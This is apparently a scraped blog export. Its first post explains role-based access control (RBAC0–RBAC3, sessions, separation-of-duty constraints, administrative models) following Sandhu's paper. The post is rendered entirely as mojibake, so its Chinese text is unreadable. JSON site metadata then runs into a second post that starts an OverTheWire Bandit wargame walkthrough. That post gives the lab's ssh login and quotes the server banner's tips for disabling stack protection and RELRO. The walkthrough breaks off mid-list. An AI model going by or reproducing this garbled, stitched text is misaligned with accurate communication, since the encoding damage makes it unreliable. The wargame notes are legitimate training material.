RBACæƒé™æ§åˆ¶æ¦‚å¿µçš„ç†è§£\nRole-Based-Access-Control__sandhu96.pdf\nä»€ä¹ˆæ˜¯ Azure èµ„æºçš„åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ (RBAC)?\nRole Based Access Control\n  RBACçš„ç®€ä»‹  RBACï¼šRole Based Access Controlï¼šåŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶  RBACçš„æ¦‚å¿µèµ·æºäºæ—©æœŸçš„å¤šç”¨æˆ·è®¡ç®—æœºç³»ç»Ÿï¼Œä»–çš„å…´èµ·æ˜¯å› ä¸ºäººä»¬éœ€è¦é€šç”¨çš„å¤šç”¨é€”çš„å¯å®šåˆ¶å·¥å…·\nRBACç®€åŒ–äº†æƒé™ç®¡ç†ï¼Œä¸ç”¨æˆ·ç»„çš„æ¦‚å¿µç›¸è¿‘\nRBACæ”¯æŒä¸‰ä¸ªè‘—åçš„å®‰å…¨æ€§åŸåˆ™ï¼šæœ€å°‘ç‰¹æƒã€æƒé™åˆ†ç¦»ã€æ•°æ®æŠ½è±¡\n  æœ€å°ç‰¹æƒåŸåˆ™ï¼Œåªæœ‰è¯¥è§’è‰²å®Œæˆä»»åŠ¡æ‰€éœ€çš„æƒåˆ©è¢«èµ‹äºˆè¯¥è§’è‰² èŒè´£åˆ†ç¦»åŸåˆ™ï¼Œç¡®ä¿äº’æ–¥è§’è‰²æ¥å®Œæˆä¸€é¡¹æ•æ„Ÿä»»åŠ¡ï¼Œä¾‹å¦‚æ¯”èµ›ä¸­ï¼Œè£åˆ¤ä¸èƒ½åŒæ—¶æ˜¯å‚èµ›é€‰æ‰‹ æ•°æ®æŠ½è±¡åŸåˆ™ï¼Œæƒåˆ©ä¾é æŠ½è±¡å®Œæˆï¼Œä¾‹å¦‚å€Ÿè®°å¡å’Œä¿¡ç”¨å¡å¯¹äºä¸€ä¸ªè´¦æˆ·ï¼Œè€Œä¸æ˜¯ç”¨æ“ä½œç³»ç»Ÿæä¾›çš„è¯»å†™æ‰§è¡Œçš„æƒåˆ©   å¯¹äºRBACï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å°†ç”¨æˆ·å¯¹åº”ä¸€ä¸ªèº«ä»½ï¼Œè€Œä¸€ä¸ªèº«ä»½æ‹¥æœ‰ç›¸åº”çš„æƒé™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º\nå°±å¦‚åŒå…¬å¸çš„é¡¹ç›®ç»ç†ï¼Œäººäº‹ç»ç†ï¼Œä¸Šåˆ°CEOï¼ŒCTOç­‰ç­‰ï¼Œæ¯ä¸ªèŒä½æœ‰ç€ç›¸åº”çš„æƒé™ï¼Œè€Œä¸”åœ¨æ¯ä¸ªå…¬å¸çš„CTOå¯ä»¥æ‹¥æœ‰ä¸åŒçš„æƒé™ï¼ŒåŒæ—¶CTOä¹Ÿå¯ä»¥ç”±ä¸åŒäººæ¥æ‹…ä»»ã€‚æŠŠè¿™ä¸ªå…³ç³»æ˜ å°„åˆ°è®¡ç®—æœºç³»ç»Ÿæ¥ï¼Œå°±æ˜¯åŸºäºè§’è‰²çš„è®¿é—®æ§åˆ¶ã€‚\nç›¸è¾ƒäºç›´æ¥å°†æƒé™åˆ†é…ç»™ç”¨æˆ·ï¼Œè¿™ç§RBACçš„æœºåˆ¶æœ‰ç€è¾ƒå¼ºçš„æ‰©å±•æ€§ï¼Œä¹Ÿä¾¿äºæƒé™ç®¡ç†ï¼šåœ¨æƒé™æ›´æ”¹æ—¶ï¼Œæ— éœ€éå†æ‰€æœ‰ç”¨æˆ·ï¼Œå¢åŠ äº†ææƒçš„æ•ˆç‡ï¼Œä»¥åŠé™ä½äº†æ¼è°ƒæƒé™çš„æ¦‚ç‡ï¼Œè¿™æ ·ç”¨æˆ·å’Œèµ„æºæƒé™è§£é™¤äº†è€¦åˆæ€§ï¼Œè¿™å°±æ˜¯ RBAC æ¨¡å‹çš„ä¼˜åŠ¿æ‰€åœ¨ã€‚\nRBACçš„åˆ†ç±» RBACæ¨¡å‹å¯ä»¥åˆ†ä¸ºï¼šRBAC0ï¼ŒRBAC1ï¼ŒRBAC2ï¼ŒRBAC3 å››ç§ã€‚å…¶ä¸­RBAC0ä¸ºåŸºç¡€ï¼Œå…¶ä»–éƒ½æ˜¯å› RBACä¸ºåŸºç¡€çš„å˜ç§ã€‚å…¶ä¸­ä»–ä»¬çš„å…³ç³»å¯ä»¥ç”±ä¸‹å›¾æ‰€ç¤ºã€‚\nRBAC0æ˜¯æœ€ä½å±‚çš„åŸºæœ¬æ¨¡å‹ã€‚RBAC1å’ŒRBAC2éƒ½åŒ…å«çš„RBAC0çš„æ‰€æœ‰ç‰¹å¾ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šæ·»åŠ äº†ä¸€äº›ç‹¬ç«‹çš„åŠŸèƒ½ï¼ŒåŒæ—¶ä¹Ÿè¢«ç§°ä¸ºadvanced models\nRBAC1ç›¸è¾ƒäºRBAC0æ·»åŠ äº†è§’è‰²ç»§æ‰¿çš„æ¦‚å¿µï¼Œå³è§’è‰²å¯ä»¥ä»å…¶ä»–è§’è‰²ä¸­ç»§æ‰¿æƒé™ï¼Œæ„Ÿè§‰æœ‰ç‚¹ç±»ä¼¼é¢å‘å¯¹è±¡ä¸­ç±»çš„ç»§æ‰¿\nRBAC2æ·»åŠ äº†ä¸€äº›é™å®šæ¡ä»¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸ºäº†èŒè´£åˆ†ç¦»ï¼Œé˜²æ­¢æ—¢æ˜¯å‚èµ›é€‰æ‰‹åˆæ˜¯è£åˆ¤çš„æƒ…å†µå‡ºç°\nRBAC3åˆå¹¶äº†RBAC1å’ŒRBAC2ï¼Œç”±äºä¼ é€’æ€§ï¼Œè‚¯å®šä¹ŸåŒ…å«äº†RBAC0çš„ç‰¹å¾\nRBACæ¨¡å‹çš„åŸºæœ¬ç‰¹å¾ç”±ä¸‹å›¾æ‰€ç¤º\nRBAC0 â€”â€”Base model è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œæœ‰ä¸‰ç»„å®ä½“ï¼šUser(ç”¨æˆ·)ï¼ŒRoles(è§’è‰²)ï¼ŒPermission(æƒé™)ï¼Œä¸Šå›¾ä¸­ä¹Ÿæœ‰**Sessions(ä¼šè¯)**çš„é›†åˆ\nç”¨æˆ·ï¼šå¯ä»¥æ˜¯æ™ºèƒ½çš„è‡ªæ²»ä»£ç†ï¼Œä¾‹å¦‚æœºå™¨äººã€é™æ­¢çš„ç”µè„‘ç”šè‡³æ˜¯ç”µè„‘ä¸­çš„ç½‘ç»œï¼Œç®€å•çš„ï¼Œæˆ‘ä»¬å¯ä»¥è®¤ä¸ºä¸€ä¸ªç”¨æˆ·å°±æ˜¯ä¸€ä¸ªäºº\nè§’è‰²ï¼šä¸€ä¸ªè§’è‰²å°±æ˜¯ä¸€ä¸ªå·¥ä½œèŒèƒ½æˆ–å·¥ä½œå(èŒåŠ¡å)ï¼Œå…·æœ‰ä¸æˆäºˆè§’è‰²æˆå‘˜çš„æƒé™å’Œè´£ä»»çš„ç›¸å…³è”çš„è¯­ä¹‰\næƒé™ï¼šæ˜¯ä¸€ç§å¯¹ç³»ç»Ÿå†…ä¸€ä¸ªæˆ–å¤šä¸ªå¯¹è±¡è®¿é—®çš„æ¨¡å¼çš„è®¸å¯ï¼Œæˆæƒæ¡æ¬¾ã€è®¿é—®æƒé™ã€ä¼˜å…ˆçº§éƒ½è±¡å¾ç€æƒé™ï¼Œæƒé™çš„æ¦‚å¿µå¯ä»¥æ˜¯å¤šæ ·åŒ–çš„\nåœ¨è¿™ä¸ªæ¡†æ¶é‡Œï¼Œæ‹’ç»è®¿é—®è¢«è®¤ä¸ºæ˜¯ä¸€ç§çº¦æŸï¼Œè€Œä¸æ˜¯ä¸€ç§æ‹’ç»çš„æƒé™\næƒé™çš„æ€§è´¨ä½¿å…¶ä¾èµ–äºç³»ç»Ÿçš„å®ç°ç»†èŠ‚å’Œç³»ç»Ÿæœ¬èº«ï¼Œå› æ­¤ä¸€ä¸ªè®¿é—®æ§åˆ¶çš„é€šç”¨æ¨¡å‹å°†æƒé™çœ‹ä½œä¸ºä¸€ä¸ªæ‰©å±•çš„æ²¡æœ‰è§£é‡Šçš„ç¬¦å·ã€‚æ¯ä¸ªç³»ç»Ÿä¿æŠ¤ç€ä»–è‡ªå·±å®ç°çš„æŠ½è±¡å¯¹è±¡ï¼Œå› æ­¤æ“ä½œç³»ç»Ÿç»´æŠ¤ç€åƒæ–‡ä»¶ã€ç›®å½•ã€è®¾å¤‡ã€ç«¯å£ç­‰ä»¥åŠå…¶è¯»å†™æ‰§è¡Œçš„æƒé™ã€‚ä¸€ä¸ªå…³ç³»å‹æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç»´æŠ¤ç€å…³ç³»ã€å…ƒç»„ã€å±æ€§ã€è§†å›¾ä»¥åŠå…¶insertã€updateã€deleteã€selectç­‰æ“ä½œ\næƒé™å¯ä»¥åº”ç”¨äºå•ä¸ªæˆ–å¤šä¸ªå¯¹è±¡\næ­£å¦‚ä¸Šå›¾æ‰€è¯´ï¼Œ**ç”¨æˆ·å’Œè§’è‰²ï¼Œè§’è‰²å’Œæƒé™éƒ½æ˜¯å¤šå¯¹å¤šçš„å…³ç³»ã€‚**ä¸€ä¸ªç”¨æˆ·å¯ä»¥æ‹¥æœ‰å¤šä¸ªè§’è‰²ï¼Œä¸€ä¸ªè§’è‰²ä¹Ÿå¯ä»¥æ‹¥æœ‰å¤šä¸ªç”¨æˆ·ï¼Œç›¸ä¼¼çš„ï¼Œä¸€ä¸ªè§’è‰²å¯ä»¥æ‹¥æœ‰å¤šä¸ªæƒé™ï¼Œä¸€ä¸ªæƒé™ä¹Ÿå¯ä»¥è¢«å¤šä¸ªè§’è‰²æ‰€æ‹¥æœ‰ã€‚RBACçš„å…³é”®æ€§è®¾è®¡å°±åœ¨è¿™ä¸¤ä¸ªå¤šå¯¹å¤šçš„å…³ç³»ã€‚è¿™ç§å¯¹åº”å…³ç³»æœ€åä½¿å¾—ä¸€ä¸ªç”¨æˆ·å¯ä»¥è¡Œä½¿ä¸€ç§æƒåˆ©ã€‚æŠŠè§’è‰²å½“ä½œç”¨æˆ·å’Œæƒé™çš„ä¸­é—´äººæä¾›äº†æ›´å¥½çš„è®¿é—®æ§åˆ¶è®¾ç½®ï¼Œæ›´åŠ ç›´æ¥çš„å°†ç”¨æˆ·å’Œæƒé™è”ç³»èµ·æ¥\nå¯¹è¯(Session)ï¼šæ˜¯ä¸€ç§ä¸€ä¸ªç”¨æˆ·å’Œå¤šç§è§’è‰²çš„æ˜ å°„ã€‚å½“ç”¨æˆ·æƒ³è¦æ¿€æ´»ä»–æ‰€å±çš„ä¸€äº›è§’è‰²æ—¶ï¼Œä¸€ä¸ªç”¨æˆ·å°†ä¼šå»ºç«‹èµ·ä¸€ä¸ªå¯¹è¯ã€‚åœ¨å¯¹è¯é‡Œï¼Œå¯¹è¯å’Œè§’è‰²æ˜¯ä¸€å¯¹å¤šçš„å…³ç³»ï¼Œç”¨æˆ·å¯¹åº”çš„å¤šç§è§’è‰²åœ¨å¯¹è¯é‡ŒåŒæ—¶è¢«å¯ç”¨ï¼Œå¯¹è¯é‡Œæ‰€æœ‰è§’è‰²æ‰€æ‹¥æœ‰çš„æƒé™éƒ½å¯ä»¥è¢«ç”¨æˆ·æ‰€ä½¿ç”¨ã€‚æ¯ä¸ªå¯¹è¯å’Œä¸€ä¸ªå•ä¸€çš„ç”¨æˆ·ç»‘å®šï¼Œè¿™ç§ç»‘å®šåœ¨ä¸€ä¸ªå¯¹è¯çš„ç”Ÿå‘½å‘¨æœŸå†…ä¿æŒä¸å˜ã€‚\nåœ¨åŒä¸€æ—¶é—´å†…ï¼Œä¸€ä¸ªç”¨æˆ·å¯èƒ½æœ‰å¤šä¸ªå¯¹è¯ï¼Œæ¯ä¸ªå¯¹è¯éƒ½åœ¨ä¸€ä¸ªä¸åŒçš„å·¥ä½œçª—å£ã€‚æ¯ä¸ªå¯¹è¯æœ‰å¯èƒ½æœ‰ä¸åŒçš„è§’è‰²ç»‘å®šã€‚è¿™ä¸ªRBAC0çš„åŠŸèƒ½æ”¯æŒæœ€å°ç‰¹æƒåŸåˆ™ã€‚ä¸€ä¸ªç”¨æˆ·å¯ä»¥æ¿€æ´»ä»–æ‰€æ‹¥æœ‰è§’è‰²é›†åˆçš„ä»»æ„å­é›†ï¼Œä¿è¯å…¶åœ¨ä¸€ä¸ªå¯¹è¯ä¸­å¯¹äºä¸€ä¸ªä»»åŠ¡æœ€åˆé€‚ã€‚å› æ­¤ï¼Œæ‹¥æœ‰ä¸€ä¸ªå¼ºå¤§æƒé™çš„è§’è‰²ä¸€èˆ¬ä¸ºä¸æ¿€æ´»ï¼Œå½“ä»–è¢«éœ€è¦æ—¶ï¼Œæ‰å»æ¿€æ´»ä»–ã€‚åœ¨ä¸€ä¸ªå¯¹è¯çš„ç”Ÿå‘½å‘¨æœŸå†…ï¼ŒRBAC0ä¹Ÿå…è®¸è§’è‰²çš„åŠ¨æ€æ¿€æ´»å’Œå¤±æ•ˆã€‚\nå‡å¦‚å°†RBAC0ä»¥å½¢å¼åŒ–è¯­è¨€è¯´æ˜ï¼Œé‚£ä¹ˆå¯ä»¥çœ‹çœ‹ä¸‹å›¾æ‰€ç¤º\nRBAC1 â€”â€”Role hierarchies è§’è‰²ç»§æ‰¿æ˜¯ä¸€ç§ç»“æ„åŒ–è§’è‰²çš„æ–¹æ³•ï¼Œå»ååº”ç»„ç»‡çš„æƒé™å’Œè´£ä»»çš„ç»“æ„\nè¿™è¾¹ç»§æ‰¿çš„æ¦‚å¿µå°±å¦‚é¢å‘å¯¹è±¡ä¸­ç»§æ‰¿çš„ç‰¹æ€§ä¸€æ ·ï¼Œè®ºæ–‡ä¸­çš„ä¾‹å­æˆ‘å°±ä¸å†å¤è¿°äº†ã€‚\nç›´æ¥åœ¨æ­¤ç»™å‡ºè®ºæ–‡ä¸­å½¢å¼åŒ–è¯­è¨€çš„æè¿°\nRBAC2 â€”â€”Constraints å®é™…ä¸Šï¼ŒRBAC1å’ŒRBAC2æ²¡æœ‰åŒ…å«å…³ç³»ï¼Œè™½ç„¶ä»–ä»¬åœ¨æ•°å­—ç‰ˆæœ¬ä¸Šæ˜¯ç›¸é‚»çš„ã€‚æ­£å¦‚RBACæ¨¡å‹çš„å…³ç³»é‡Œï¼Œè¿™ä¸¤ä¸ªæ˜¯å±äºå¹¶åˆ—å…³ç³»çš„ã€‚\nçº¦æŸ(Constraints)ä¹Ÿæ˜¯RBACæ¨¡å‹ä¸­é‡è¦çš„ä¸€æ–¹é¢ã€‚\nåœ¨è®ºæ–‡ä¸­ï¼Œæ˜¯é‡‡è´­ç»ç†å’Œè´¢åŠ¡ç»ç†çš„å…³ç³»ï¼Œè¿™ä¸¤ä¸ªèŒè´£æ˜æ˜¾ä¸èƒ½ç”±åŒä¸€ä¸ªäººæ¥æ‹…ä»»ï¼Œå› ä¸ºè¿™å›é€ æˆæ¬ºè¯ˆã€‚è¿™æ˜¯ä¸€ä¸ªå†å²æ‚ ä¹…çš„åŸåˆ™â€”â€”èŒè´£åˆ†ç¦»ã€‚ä¸è¿‡å¯¹äºä¾‹å­ï¼Œæˆ‘æ›´å–œæ¬¢åœ¨åšå®¢ä¸­çœ‹åˆ°çš„è¿™ä¸ªä¾‹å­ï¼šä¸€ä¸ªäººä¸èƒ½å†æ¯”èµ›ä¸­åŒæ—¶æ‹…ä»»å‚èµ›é€‰æ‰‹å’Œè£åˆ¤ï¼Œè¿™æ˜æ˜¾çš„ä¼šé€ æˆæ¯”èµ›å…¬å¹³æ€§ç¼ºå¤±ï¼Œè™½ç„¶è¿™åœ¨ç°å®ä¸­å‡ ä¹ä¸å¯èƒ½å‘ç”Ÿï¼Œä½†æˆ‘è§‰å¾—è¿™æ˜¯å¯¹äºè¿™ä¸ªæ–¹é¢æœ€ç›´è§‚çš„ä½“ç°ã€‚\nçº¦æŸæ˜¯åœ¨æ›´é«˜ç­‰çº§ç»„ç»‡æ”¿ç­–ä¸­ä¸€ç§æœ‰åŠ›çš„æœºåˆ¶ã€‚ç¡®å®šçš„è§’è‰²éœ€è¦è¢«å®šä¹‰ä¸ºç›¸äº’æ’æ–¥çš„ï¼Œå³èŒè´£åˆ†ç¦»ã€‚\nåªè¦RBACçš„ç®¡ç†æ˜¯è¢«ä¸€ä¸ªé«˜çº§å®‰å…¨å®˜å‘˜å®Œå…¨ä¸­å¿ƒåŒ–ç®¡ç†çš„ï¼Œçº¦æŸå°±æ˜¯éå¸¸çš„æ–¹ä¾¿ï¼ŒåŒæ—¶ä¹Ÿä½“ç°äº†é«˜çº§å®‰å…¨å®˜å‘˜çš„å†³ç­–å½±å“ååˆ†é‡å¤§ã€‚ä½†å‡å¦‚RBACçš„ç®¡ç†å»ä¸­å¿ƒåŒ–ï¼Œçº¦æŸå°±å˜æˆäº†ä¸€ç§æœºåˆ¶ï¼Œä½¿å¾—çº§åˆ«é«˜çš„å®‰å…¨å®˜å‘˜å¯ä»¥é™åˆ¶ç”¨æˆ·è¡Œä½¿ç®¡ç†æƒé™\nçº¦æŸåº”ç”¨äºUser Assignmentå’ŒPermission Assignmentçš„å…³ç³»ï¼Œä½¿å¾—è¿”å›ä¸€ä¸ªå‡½æ•°å€¼ä¸ºæ¥æ”¶æˆ–è€…ä¸æ¥å—ã€‚\nä»¥ä¸‹æ˜¯è®ºæ–‡ä¸­å¯¹çº¦æŸçš„å®šä¹‰\nåœ¨è¿™ä¸ªå®šä¹‰ä¸‹ï¼Œæƒé™å¿…é¡»å…·æœ‰åŸå­æ€§\næœ‰äº›è§’è‰²äº§ç”Ÿçš„å†å²åŸå› å°±æ˜¯ä¸ºäº†åˆ¶çº¦å¦ä¸€ä¸ªè§’è‰²ï¼Œè£åˆ¤å‘˜å°±æ˜¯ä¸ºäº†åˆ¶çº¦è¿åŠ¨å‘˜ä»è€Œè®©è¿åŠ¨å‘˜æŒ‰ç…§è§„èŒƒå»æ¯”èµ›ã€‚å¦‚æœä¸€ä¸ªäººå…¼ä»»è¿™ä¸¤ä¸ªè§’è‰²ï¼Œæ¯”èµ›å¿…ç„¶å®¹æ˜“å‡ºç°ä¸å…¬æ­£çš„æƒ…å†µä»è€Œè¿èƒŒç«æŠ€å…¬å¹³æ€§å‡†åˆ™ã€‚è¿˜æœ‰å°±æ˜¯æˆ‘ä»¬æ¯ä¸ªäººåœ¨ä¸åŒçš„åœºæ™¯éƒ½ä¼šå……å½“ä¸åŒçš„è§’è‰²ï¼Œåœ¨å…¬å¸ä½ å°±æ˜¯ç‰¹å®šå²—ä½çš„å‘˜å·¥ï¼Œåœ¨å®¶åº­ä¸­ä½ å°±æ˜¯ä¸€åå®¶åº­æˆå‘˜ã€‚éšç€åœºæ™¯çš„åˆ‡æ¢ï¼Œæˆ‘ä»¬çš„è§’è‰²ä¹Ÿåœ¨éšä¹‹å˜åŒ–ã€‚æ‰€ä»¥ RBAC2 åœ¨ RBAC0 çš„åŸºç¡€ä¸Šå¼•å…¥äº†é™æ€èŒè´£åˆ†ç¦»ï¼ˆStatic Separation of Dutyï¼Œç®€ç§°SSDï¼‰å’ŒåŠ¨æ€èŒè´£åˆ†ç¦»ï¼ˆDynamic Separation of Dutyï¼Œç®€ç§°DSDï¼‰ä¸¤ä¸ªçº¦æŸæ¦‚å¿µã€‚ä»–ä»¬ä¸¤ä¸ªä½œç”¨çš„ç”Ÿå‘½å‘¨æœŸæ˜¯ä¸åŒçš„;\n  SSD ä½œç”¨äºçº¦æŸç”¨æˆ·å’Œè§’è‰²ç»‘å®šæ—¶ã€‚ 1.äº’æ–¥è§’è‰²ï¼šå°±åƒä¸Šé¢çš„ä¾‹å­ä½ ä¸èƒ½æ—¢æ˜¯Aåˆæ˜¯Bï¼Œäº’æ–¥çš„è§’è‰²åªèƒ½äºŒé€‰ä¸€ ; 2. æ•°é‡çº¦æŸï¼šç”¨æˆ·çš„è§’è‰²æ•°é‡æ˜¯æœ‰é™çš„ä¸èƒ½å¤šäºæŸä¸ªåŸºæ•°ï¼› 3. æ¡ä»¶çº¦æŸï¼šåªèƒ½è¾¾åˆ°æŸä¸ªæ¡ä»¶æ‰èƒ½æ‹¥æœ‰æŸä¸ªè§’è‰²ã€‚ç»å¸¸ç”¨äºç”¨æˆ·ç­‰çº§ä½“ç³»ï¼Œåªæœ‰ä½ å……é’±æˆä¸ºVIPæ‰èƒ½ä¸€åˆ€999ã€‚\n  DSD ä½œç”¨äºä¼šè¯å’Œè§’è‰²äº¤äº’æ—¶ã€‚å½“ç”¨æˆ·æŒæœ‰å¤šä¸ªè§’è‰²ï¼Œåœ¨ç”¨æˆ·é€šè¿‡ä¼šè¯æ¿€æ´»è§’è‰²æ—¶åŠ ä»¥æ¡ä»¶çº¦æŸï¼Œæ ¹æ®ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„ç­–ç•¥ã€‚\n  RBAC3 â€”â€”Consolidated Model RBAC3å°†RBAC1å’ŒRBAC2çš„ç‰¹æ€§ç»“åˆèµ·æ¥ï¼Œä¹Ÿå°±æ˜¯åœ¨RBAC0çš„åŸºç¡€ä¸ŠåŒæ—¶æ‹¥æœ‰äº†è§’è‰²ç»§æ‰¿å’Œçº¦æŸçš„ä¸¤ä¸ªç‰¹æ€§ã€‚\nçº¦æŸå¯ä»¥è¢«åº”ç”¨äºè§’è‰²ç»§æ‰¿ä¸­ã€‚ä¾‹å¦‚çº¦æŸå¯ä»¥é™åˆ¶ä¸€ä¸ªè§’è‰²çš„æ•°é‡ï¼Œæ¯”å¦‚ä¸€ä¸ªå…¬å¸åªèƒ½æœ‰1ä¸ªceoï¼›åœ¨æ­¤æ¨¡å‹ä¸­ï¼Œçº¦æŸå¯ä»¥æ˜¯å¤šæ ·åŒ–çš„ï¼Œä¸ä»…å¯ä»¥çº¦æŸè§’è‰²çš„æ•°é‡ï¼Œä¹Ÿå¯ä»¥çº¦æŸè§’è‰²çš„å…³ç³»ã€‚\nçº¦æŸåœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œå°¤å…¶æ˜¯åœ¨æ›´æ”¹è§’è‰²å±‚æ¬¡ç»“æ„çš„æƒé™å·²ç»è¢«åˆ†æ•£çš„æƒ…å†µä¸‹\nç®¡ç†æ¨¡å‹â€”â€”Management models ä»¥ä¸Šçš„ç®¡ç†æ¨¡å‹éƒ½æ˜¯åŸºäºå•ä¸ªå®‰å…¨ç®¡ç†å‘˜ï¼Œåœ¨å¤§å‹ç³»ç»Ÿä¸­ï¼Œä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å›¢é˜Ÿ\né‚£ä¹ˆé—®é¢˜å°±æ¥äº†ï¼ŒRBACå¦‚ä½•ç®¡ç†è‡ªå·±å‘¢ï¼Ÿ\nä½œè€…ç»™å‡ºäº†å¦‚å›¾ä¸‹è¿™æ ·ä¸€ç§æ¨¡å‹\nåœ¨æ­¤æ¨¡å‹ä¸­ï¼Œçº¦æŸåº”ç”¨äºRBACä¸­çš„ä»»ä¸€éƒ¨åˆ†ï¼Œå›¾ä¸­ä¸ŠåŠéƒ¨åˆ†ä¸å’ŒRBAC0çš„åŸºæœ¬æ¨¡å‹çš„ç±»ä¼¼ï¼Œå¢åŠ äº†ä¸‹åŠéƒ¨åˆ†ï¼Œç”¨äºå¯¹ç®¡ç†è§’è‰²(AR)å’Œç®¡ç†æƒåŠ›(AP)çš„è¯´æ˜ï¼Œæ™®é€šæƒé™åªèƒ½ç»™æ™®é€šè§’è‰²ï¼Œè€Œç®¡ç†æƒé™åªèƒ½ç»™ç®¡ç†è§’è‰²ï¼Œè¿™æ˜¯ä¸ªå†…åœ¨çº¦æŸã€‚ ä½œè€…è®¤ä¸ºåœ¨ç®¡ç†ç®¡ç†å±‚æ¬¡æ—¶ï¼Œåªéœ€è¦ä¸€ä¸ªä¸»è¦çš„å®‰å…¨ç®¡ç†å‘˜å°±å¤Ÿäº†ï¼Œä¸éœ€è¦ç¬¬äºŒä¸ªç®¡ç†å±‚æ¬¡æ¥ç®¡ç†ç¬¬ä¸€ä¸ªã€‚\n ç®¡ç†è€…çš„æƒåŠ›åŒ…æ‹¬ï¼š\n ä¿®æ”¹UA ä¿®æ”¹PA ä¿®æ”¹è§’è‰²å±‚æ¬¡å…³ç³»   RBACä¸­çš„ç®¡ç†æƒé™å¯ä»¥çœ‹ä½œæ˜¯ä¿®æ”¹ç”¨æˆ·åˆ†é…ï¼Œæƒé™åˆ†é…å’Œè§’è‰²å±‚æ¬¡å…³ç³»çš„åŠŸèƒ½ã€‚åœ¨ç®¡ç†æ¨¡å‹ä¸­ï¼Œå¿…é¡»æ˜¾å¼å®šä¹‰è¿™äº›ç®¡ç†æ“ä½œçš„æƒé™ã€‚è¿™äº›æƒé™çš„ç¡®åˆ‡æ€§è´¨æ˜¯å…·ä½“å®ç°ï¼Œä½†æ˜¯ä»–ä»¬çš„ä¸€èˆ¬æ€§è´¨å‡ ä¹ç›¸åŒã€‚\nä¸€èˆ¬åœ°ï¼Œæ¯ä¸ªç®¡ç†è§’è‰²éƒ½å°†æ˜ å°„åˆ°å¥¹è´Ÿè´£ç®¡ç†çš„è§’è‰²å±‚æ¬¡ç»“æ„çš„æŸä¸ªå­é›†ã€‚ç®¡ç†çš„å…¶ä»–æ–¹é¢ä¹Ÿéœ€è¦é™å®šèŒƒå›´ï¼Œæ¯”å¦‚åˆ é™¤è¡Œä¸ºå’Œä¿®æ”¹è¡Œä¸ºå°±ä¸ä¸€æ ·ï¼Œå¯ä»¥åœ¨æ­¤é™å®šèŒƒå›´ã€‚\næ¦‚å¿µç†è§£ è§’è‰²ï¼ˆRoleï¼‰ è§’è‰²æ˜¯ä¸€ä¸ªç»„ç»‡ä¸­çš„ä¸€ä¸ªèŒåŠ¡èŒèƒ½æˆ–èŒç§°\nè§’è‰²çš„æ¦‚å¿µä¸åœ¨è®¿é—®æ§åˆ¶ä¸­çš„ç”¨æˆ·ç»„çš„æ¦‚å¿µç›¸è¿‘ï¼Œä½†æ˜¯ä¸€ä¸ªè§’è‰²æ˜¯æŠŠä¸€ç»„ç”¨æˆ·å’Œä¸€äº›æƒé™å…³è”åœ¨ä¸€èµ·ï¼Œè€Œç”¨æˆ·ç»„å´åªèƒ½ä»£è¡¨ä¸€ç»„çš„ç”¨æˆ·\nå¤šè§’è‰²åˆ†é…ï¼šå‡å¦‚æœ‰ä¸€ä¸ªç”¨æˆ·è¢«åˆ†é…åˆ°äº†å¤šç§è§’è‰²ï¼Œé‚£ä¹ˆä¼šæ€ä¹ˆæ ·å‘¢ï¼ŸRBACæ˜¯ä¸€ä¸ªåŠ æ³•æ¨¡å‹ï¼Œå› æ­¤ï¼Œè¯¥ç”¨æˆ·ä¼šæ‹¥æœ‰å…¶æ‰€åˆ†é…åˆ°çš„æ‰€æœ‰è§’è‰²æ‰€å…·æœ‰çš„æƒé™ã€‚\næƒé™ï¼ˆPermissionï¼‰ æƒé™å…·æœ‰åŸå­æ€§ï¼Œä¸å¯å†åˆ†\nåœ¨RBACæ¡†æ¶é‡Œï¼Œæ‹’ç»è®¿é—®è¢«å»ºæ¨¡ä¸ºä¸€ä¸ªçº¦æŸï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå¦å®šçš„æƒé™ã€‚\n","description":"","tags":["linux","security"],"title":"Role-Based-Access-Control","uri":"/posts/role-based-access-control/"},{"categories":["ctf"],"content":"é‰´äºæœ€è¿‘çš„çŠ¶æ€ï¼Œçœ‹é€†å‘åˆçœ‹ä¸è¿›å»ï¼Œå°±æ‰¾äº†ä¸ªç®€å•çš„é¶åœºç©ä¸€ç©\nhttps://overthewire.org/wargames/\nWargames Suggested order to play the games in  Bandit Leviathan or Natas or Krypton Narnia Behemoth Utumno Maze â€¦  Bandit  From the official tips: There are several things you can try when you are unsure how to continue:\n First, if you know a command, but donâ€™t know how to use it, try the manual (man page) by entering â€œ**man **â€ (without the quotes). e.g. if you know about the â€œlsâ€ command, type: man ls. The â€œmanâ€ command also has a manual, try it. Press q to quit the man command. Second, if there is no man page, the command might be a shell built-in. In that case use the â€œ**help **â€ command. E.g. help cd Also, your favorite search-engine is your friend. Learn how to use it! I recommend Google. Lastly, if you are still stuck, you can join us on IRC   Level 0 å…³äºsshçš„ç”¨æ³•\n1  ssh bandit0@bandit.labs.overthewire.org -p 2220   è¿ä¸Šä¸»æœºåä¾¿å¯ä»¥å¼€å§‹æ¸¸æˆ\n--[ Playing the games ]-- This machine might hold several wargames. If you are playing \"somegame\", then: * USERNAMES are somegame0, somegame1, ... * Most LEVELS are stored in /somegame/. * PASSWORDS for each level are stored in /etc/somegame_pass/. Write-access to homedirectories is disabled. It is advised to create a working directory with a hard-to-guess name in /tmp/. You can use the command \"mktemp -d\" in order to generate a random and hard to guess directory in /tmp/. Read-access to both /tmp/ and /proc/ is disabled so that users can not snoop on eachother. Files and directories with easily guessable or short names will be periodically deleted! Please play nice: * don't leave orphan processes running * don't leave exploit-files laying around * don't annoy other players * don't post passwords or spoilers * again, DONT POST SPOILERS! This includes writeups of your solution on your blog or website! --[ Tips ]-- This machine has a 64bit processor and many security-features enabled by default, although ASLR has been switched off. The following compiler flags might be interesting: -m32 compile for 32bit -fno-stack-protector disable ProPolice -Wl,-z,norelro disable relro In addition, the execstack tool can be used to flag the stack as executable on ELF binaries. Finally, network-access is limited for most levels by a local firewall. --[ Tools ]-- For your convenience we have installed a few usefull tools which you can find in the following locations: * pwndbg 